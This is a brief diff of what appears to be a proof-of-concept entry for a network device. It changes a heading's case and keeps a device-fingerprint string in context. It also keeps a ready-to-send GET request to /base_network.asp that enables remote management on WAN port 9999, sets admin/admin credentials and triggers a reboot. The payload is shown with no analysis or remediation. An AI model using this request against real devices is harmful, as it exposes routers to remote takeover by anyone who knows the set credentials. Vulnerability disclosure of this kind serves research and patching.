@@ -10,7 +10,7 @@
 body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
 ```
 
-## poc
+## POC
 
 ```
 GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1
